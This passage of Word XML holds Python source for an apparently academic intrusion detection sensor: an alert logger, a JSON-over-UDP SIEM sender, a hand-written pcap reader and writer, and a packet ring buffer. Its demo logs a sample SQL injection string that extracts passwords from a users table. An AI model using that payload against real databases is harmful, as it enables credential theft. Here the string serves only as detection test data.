    <w:p w14:paraId="48B31E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AADCF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excerpt = privacy.payload_excerpt(payload, limit=limit,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="190BF7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privacy_mode=privacy_mode) if payload else ""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B1176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safe_ip = privacy.anonymise_ip(src_ip, anonymise) if src_ip else ""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67EF8E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4D56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 = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DFA72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time.strftime("%Y-%m-%d %H:%M:%S"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BF891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safe_ip,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49F5F3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engine or meta["engine"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B8183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 or meta["kind"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32AC96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meta["severity"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2209C4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meta["risk_score"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BB94E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"" if confidence is None else round(float(confidence), 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F08E4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"%s (%s)" % (meta["technique_id"], meta["technique"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53266C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"%s (%s)" % (meta["tactic_id"], meta["tactic"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04283E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excerpt,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16E23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privacy.redact(message) if privacy_mode else message,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00655A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4B40AC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3374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5010A8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self._lock:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A1F2B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with open(self.filename, "a", newline="", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08E3E8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        csv.writer(f).writerow(row)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A4832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self.rows_written += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ED389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044BB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log error:", e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68E5FA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D468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close(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44CC80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self.rows_written</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7476694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B2A2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1438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UDPSender:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D4B2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"""Ships alerts to the SIEM as structured JSON datagrams.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25D1772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D5D1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FR-5 requires alerts to be serialised "into structured JSON objects" before</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D46C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transmission. A JSON frame also lets the dashboard render fields (severity,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0864B3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ATT&amp;CK technique, risk score, source IP) as real columns instead of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A58F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re-parsing an English sentence on the receiving end.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="620E66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846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 `ts` text field is retained so an older text-only listener still shows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ABF74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something meaningful, and so the receiver can validate the frame.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DEE4B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19CF98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2C20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target_ip, port=9999, config=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53F380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self.target = (target_ip, port)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F8E52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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F0B5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self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A7DDA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self.sent = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="692A59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self.failed = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18AA5A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6552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send_log(self, message, src_ip=None, engine=None, confidence=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C282A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payload=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C035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 = mitre.enrich(message, confidence)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17F7E0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71CD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limit = getattr(self.config, "payload_excerpt_bytes", 64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77D3F4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privacy_mode = getattr(self.config, "privacy_mode", True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="194BC3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anonymise = getattr(self.config, "anonymise_ips", False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A9545A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9EDB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 = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="384C66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"v": 1,                                  # schema version</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="660646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"ts": time.strftime("%Y-%m-%d %H:%M:%S"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19DBAB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"message": privacy.redact(message) if privacy_mode else message,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B51BF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"src_ip": privacy.anonymise_ip(src_ip, anonymise) if src_ip else "",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A352B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"engine": engine or meta["engine"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54D45F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"kind": meta["kind"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7267EE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"severity": meta["severity"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="182B1A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"risk_score": meta["risk_score"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48A8B0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"technique_id": meta["technique_id"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A78E9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"technique": meta["technique"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B9191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"tactic": meta["tactic"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A86FB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"confidence": None if confidence is None else round(float(confidence), 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="277A3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76A69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payload:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="686C38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frame["payload_excerpt"] = privacy.payload_excerpt(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB997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payload, limit=limit, privacy_mode=privacy_mode)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CF031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A08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7A6158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 = json.dumps(frame).encode("utf-8")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03974A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a UDP datagram must stay inside the path MTU to avoid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E1858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fragmentation; excerpts are already capped so this is a guard</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="670883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len(data) &gt; 1400:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CBC58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frame.pop("payload_excerpt", None)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="708ACE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data = json.dumps(frame).encode("utf-8")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1810A9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self.sock.sendto(data, self.target)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5245BA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self.sent += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58023C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68C5FA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self.failed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E152F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print("[!] udp send error:", e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DD165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27C95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64A3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9DFEC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log = Logger("demo_logs.csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E78A7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log.log_alert("MALICIOUS PAYLOAD! Keywords: ['UNION', 'SELECT']",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25BDCF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src_ip="192.168.1.57", confidence=0.99,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DDECA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payload=b"id=1 UNION SELECT password FROM users")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67163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log.log_alert("DDoS DETECTED! Z-Score: 4.21 (PPS: 8500)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59FCDD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src_ip="10.0.0.9", confidence=0.88)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54B92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print("wrote %d rows to demo_logs.csv" % log.rows_written)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EEF7F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open("demo_logs.csv", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F2C7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print(f.read())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10D755AA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src/utils/pcap.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FFE1F8B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(196 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="430CE7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#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="611D92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"""libpcap (.pcap) reader and writer implemented from the file-format spec.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4692C1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1A67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Chapter 3 commits to evaluating the sensor against "offline PCAP replays of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B1191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CIC-IoT2023 dataset", and the zero-dependency constraint rules out Scapy,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C188F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dpkt and libpcap bindings. This module therefore implements the classic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2550E5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libpcap capture-file format directly with `struct`, exactly as the sensor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B83B3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already decodes Ethernet and IP headers by hand.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="768869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4F65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Two capabilities follow from it:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0303B65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75EB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Verifiability - captures written by MANTIS open natively in Wireshark</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06D9C3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and tcpdump, so the claim that the sensor genuinely reads Layer 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B37C3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frames can be independently checked by a marker rather than trusted.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5563CB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Reproducibility - a saved capture can be replayed through the detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="707203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engines with no root privileges and no live attack traffic, making every</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="610695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evaluation run deterministic and repeatable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54A3E9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49BA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File layout (libpcap 2.4):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A806E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2BBF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global header  24 bytes   magic, version, tz, sigfigs, snaplen, linktype</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65644F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per packet     16 bytes   ts_sec, ts_usec, incl_len, orig_len</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54560E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+ incl_len bytes of raw frame</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04813D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2FE8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`incl_len` may be smaller than `orig_len` when a snapshot length is applied;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61EF02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Wireshark renders such frames as truncated, which is the correct</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2941A0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representation of a header-only capture.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55B29C2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1E5C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67D3CC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436A5EE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C832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struct</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="354B8C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2E4D88F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8B63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MAGIC_MICRO = 0xA1B2C3D4      # timestamps in microseconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="516CCA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MAGIC_NANO = 0xA1B23C4D       # timestamps in nanoseconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5598C8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LINKTYPE_ETHERNET = 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="615E42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36FE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_GLOBAL_HEADER = "IHHiIII"    # 24 bytes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70C6EC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_RECORD_HEADER = "IIII"       # 16 bytes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5D4FC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CA828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FD2F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PcapError(Exception):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B2694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pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="322D86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9FBDA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3A5B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global_header(snaplen=65535, linktype=LINKTYPE_ETHERNET, endian="&lt;"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67CE3B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struct.pack(endian + _GLOBAL_HEADER,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DCC4C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MAGIC_MICRO,   # magic number</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51AEF9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2, 4,          # version major, minor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40A1F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0,             # thiszone (GMT correction)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20D090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0,             # sigfigs (unused in practice)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C4650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snaplen,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="309AAC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linktype)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D48F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A1A2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CECA5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record(raw, ts=None, orig_len=None, snaplen=65535, endian="&lt;"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9795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"""Pack one packet record (header + data)."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B4FE8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ts is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33A4F5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ts = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A737D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data = bytes(raw)[:snaplen]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BAAC8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orig_len is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01DD62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orig_len = len(raw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="252723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ts_sec = int(ts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69864C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ts_usec = int(round((ts - ts_sec) * 1_000_000))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="603308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ts_usec &gt;= 1_000_000:       # guard against rounding to 1.0s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20ED07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ts_sec += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="404CB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ts_usec -= 1_000_000</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A31AE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head = struct.pack(endian + _RECORD_HEADER,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EFEFF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ts_sec, ts_usec, len(data), max(orig_len, len(data)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="578F08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head + data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="253AA3F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B0CB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7C54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PcapWriter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ECE32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"""Streaming writer. Usable directly or as a context manager."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17653C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DE56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path, snaplen=65535, linktype=LINKTYPE_ETHERNET):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69B73A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self.path = path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="353F74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self.snaplen = snaplen</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E5E02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= 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="578335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self._fh = open(path, "wb")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F9BCC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self._fh.write(global_header(snaplen, linktype))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="770AAD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self._fh.flush()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FB1D9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F9F7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write(self, raw, ts=None, orig_len=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54AA27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self._fh.write(record(raw, ts=ts, orig_len=orig_len,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EBD2D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snaplen=self.snaplen))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A905E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self.count += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F81D4A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C8F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flush(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52304D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self._fh and not self._fh.closed:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="221385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self._fh.flush()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61F389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E491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close(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A7DE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self._fh and not self._fh.closed:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="580C6A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self._fh.flush()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F5954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self._fh.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50FEBC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8135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__enter__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12DC6C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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D4854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DA43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__exit__(self, *exc):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="325AFC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self.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6794C2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5100A9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6050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E9D2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PcapReader:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="533057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"""Iterate a .pcap file yielding (timestamp, raw_bytes, original_length).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="009F2C3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70C4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Handles both byte orders and both microsecond and nanosecond magics, so</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0237D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captures produced by tcpdump on any host are accepted.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="348ACA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B7CE9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1275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path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="692E9C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self.path = path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C2D27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self._fh = open(path, "rb")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B401B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head = self._fh.read(24)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55786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len(head) &lt; 24:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="066370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self._fh.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FCD33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PcapError("%s: truncated global header" % path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E3F89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9864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magic = struct.unpack("&lt;I", head[:4])[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F4280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magic == MAGIC_MICRO:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="653D9A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self.endian, self.nano = "&lt;", False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="076640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magic == MAGIC_NANO:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B4AC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self.endian, self.nano = "&lt;", True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46404E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struct.unpack("&gt;I", head[:4])[0] == MAGIC_MICRO:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C0C2F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self.endian, self.nano = "&gt;", False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A747A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elif struct.unpack("&gt;I", head[:4])[0] == MAGIC_NANO:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1187B1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self.endian, self.nano = "&gt;", True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DB09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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AC9A2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self._fh.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44785B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raise PcapError("%s: not a pcap file (magic=0x%08x)" % (path, magic))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5851CE5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64BD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(_, self.version_major, self.version_minor, self.thiszone,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B3EF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self.sigfigs, self.snaplen, self.linktype) = struct.unpack(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5602C7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self.endian + _GLOBAL_HEADER, head)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B56FB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8B48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__iter__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546DDB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divisor = 1_000_000_000.0 if self.nano else 1_000_000.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1593FC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while True:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6937DF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head = self._fh.read(16)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F9268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len(head) &lt; 16:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EB5A3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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29553A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ts_sec, ts_frac, incl_len, orig_len = struct.unpack(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45C19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self.endian + _RECORD_HEADER, head)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DE29C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 = self._fh.read(incl_len)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69A3A5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len(data) &lt; incl_len:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46188F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 # truncated final record</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="375397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yield (ts_sec + ts_frac / divisor, data, orig_len)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE80CA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392B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close(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="653430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self._fh and not self._fh.closed:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E4644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self._fh.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08AC760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3951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__enter__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="410B80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self</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="715ADD2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E3C0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__exit__(self, *exc):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D6618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self.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60BD70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5E974D8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85D08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19D32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build_from_records(records, snaplen=65535):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46AE88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"""Build a complete .pcap byte string from MANTIS packet-store records.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C85AD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50F8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Each record is the dict held in the in-memory ring buffer: a hex-encoded</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A690B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frame snapshot plus the original on-wire length. This is what the SIEM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ADA1C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serves from /api/export.pcap so the analyst can open the live buffer in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7819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Wireshark.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2683C3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27E7CF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out = [global_header(snaplen)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="031688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item in records:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1272C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hex_data = item.get("hex") or ""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D0DF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0230F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 = bytes.fromhex(hex_data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C23E3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ValueError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47E166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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D176E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out.append(record(raw,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76FDE4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ts=item.get("ts"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="053898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orig_len=item.get("length", len(raw)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67461A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snaplen=snaplen))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078146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b"".join(out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="058CFBF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AA814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2E5F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020442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round-trip self-check</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="788221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frame = bytes.fromhex("ffffffffffff001122334455080045000014")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="334C5C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path = "selftest.pcap"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13960C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PcapWriter(path, snaplen=96) as w:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E5DDB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w.write(frame, ts=1700000000.123456, orig_len=1514)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71BBF1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PcapReader(path) as r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5232A0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print("linktype=%d snaplen=%d" % (r.linktype, r.snaplen))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B484D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ts, data, orig in r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FDC7B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print("ts=%.6f incl=%d orig=%d match=%s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="687103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% (ts, len(data), orig, data == frame))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="529915B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src/utils/packet_store.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55E1E3EB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(142 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55F186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2DB5B4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"""In-memory packet history for MANTIS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EE5323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C49F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Acts like a tiny local "database" that lives entirely in RAM: a fixed-size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="771B85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ring buffer of the most recently captured packets. This lets the web</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E9A8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dashboard show real captured traffic (source/destination, protocol, flags,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FF2F1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length and a raw hex dump) that the analyst can scroll through and inspect,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4624A6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instead of the mock packets used before.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07220B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2410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Zero dependencies - standard library only, consistent with the rest of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42922F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MANTIS. Thread-safe because the sensor writes from the analyzer thread while</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D30EB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SIEM web server reads from HTTP handler threads.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D563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0D5C42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7D68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111E14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A136E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collections import deque</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="669071B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6869F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6B681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PacketStore:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7292D1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maxlen=5000):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05810E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ring buffer: when full, the oldest packet is dropped automatically</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="430E10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self._packets = deque(maxlen=maxlen)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D892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self._lock = threading.Lock()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61F0B3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self._seq = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A25BE5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048C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live traffic stats (updated once per second by the sensor)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A8E72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self.pps = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25D213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self.mean = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="074194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self.z_score = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79D965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self.ddos_candidate = False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="241F7F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self.ddos_active = False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="677CC4A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901A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cumulative counters for the whole session</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B48E0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self.proto_counts = {"TCP": 0, "UDP": 0, "ICMP": 0, "OTHER": 0}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05EBAC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self.talkers = {}          # src ip -&gt; packet count</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D3B7C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self.total_seen = 0        # total packets ever recorded (not capped)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E2B9F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803A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add(self, record):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0461E4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"""Store one captured packet. `record` is a small dict of metadata."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A9731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55654F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self._seq += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AACF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self.total_seen += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48AB80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record["no"] = self._seq</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7672CF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self._packets.append(record)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D81A7C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0ED9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proto = record.get("proto", "OTHER")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EAFA4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self.proto_counts[proto] = self.proto_counts.get(proto, 0) + 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="634722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0D5F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src = record.get("src")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B0F77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src:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B77B6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self.talkers[src] = self.talkers.get(src, 0) + 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB286E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DEE4B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update_stats(self, pps, mean, z_score, ddos_candidate=False,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C894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ddos_active=False):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF53D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self.pps = pps</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61462D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self.mean = mean</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C56D4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self.z_score = z_score</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A260E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self.ddos_candidate = bool(ddos_candidate)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7113A5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self.ddos_active = bool(ddos_active)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19BDE1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8F06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get_recent(self, limit=200, proto=None, query=None, after=0):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF352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"""Return the newest packets first, with optional filtering.</w:t>
      </w:r>
    </w:p>
